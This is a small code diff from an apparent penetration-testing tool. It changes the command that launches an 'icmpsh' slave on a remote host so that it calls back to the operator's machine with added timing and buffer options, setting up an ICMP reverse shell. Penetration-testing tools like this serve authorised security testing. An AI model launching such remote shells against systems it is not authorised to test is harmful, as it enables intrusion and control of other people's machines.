@@ -81,7 +81,7 @@ class ICMPsh:
         infoMsg  = "running icmpsh slave remotely"
         logger.info(infoMsg)
 
-        self.__icmpshSlaveCmd = "%s -t %s" % (self.__icmpslaveRemote, self.lhostStr)
+        self.__icmpshSlaveCmd = "%s -t %s -d 500 -b 30 -s 128" % (self.__icmpslaveRemote, self.lhostStr)
 
         cmd = "%s &" % self.__icmpshSlaveCmd
 
